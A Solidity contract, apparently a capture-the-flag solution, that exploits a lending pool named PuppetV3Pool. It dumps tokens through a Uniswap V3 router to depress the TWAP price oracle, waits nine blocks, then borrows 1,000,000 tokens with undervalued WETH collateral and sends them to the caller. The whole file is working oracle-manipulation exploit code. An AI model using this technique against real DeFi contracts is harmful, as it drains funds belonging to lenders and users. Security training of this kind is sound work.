// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "./PuppetV3Pool.sol";
import "hardhat/console.sol";

interface IRouter {
        struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256);
}

contract AttackPuppetv3 {

    constructor(IERC20Minimal token) {
        IRouter router = IRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        IERC20Minimal weth = IERC20Minimal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        uint256 tokenAmount = token.balanceOf(address(this));

        token.approve(address(router), tokenAmount);

        IRouter.ExactInputSingleParams memory params = IRouter.ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: tokenAmount,
                amountOutMinimum: 99 ether,
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(params);
    }

    //wait 9 block before calling to reduce twap price
    function attack(IERC20Minimal token, PuppetV3Pool pool) public {
        IERC20Minimal weth = IERC20Minimal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(1000000 ether);
        token.transfer(msg.sender, 1000000 ether);
    }
}